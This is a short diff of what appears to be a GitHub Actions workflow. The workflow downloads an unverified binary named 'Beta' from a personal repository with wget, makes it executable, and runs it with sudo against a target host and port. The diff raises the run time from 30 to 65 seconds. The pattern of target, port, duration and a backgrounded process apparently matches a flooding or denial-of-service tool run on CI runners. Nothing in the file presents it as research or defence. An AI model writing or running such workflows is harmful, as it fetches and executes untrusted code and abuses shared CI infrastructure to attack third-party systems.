@@ -32,9 +32,9 @@ jobs:
           wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/raw -O Beta
           chmod +x Beta || true
           
-          sudo timeout 30 ./Beta "$TARGET" "$PORT" 30 123 &
+          sudo timeout 65 ./Beta "$TARGET" "$PORT" 65 123 &
           
       - name: Finish !
         run: |
-          sleep 30
+          sleep 65
           exit 0
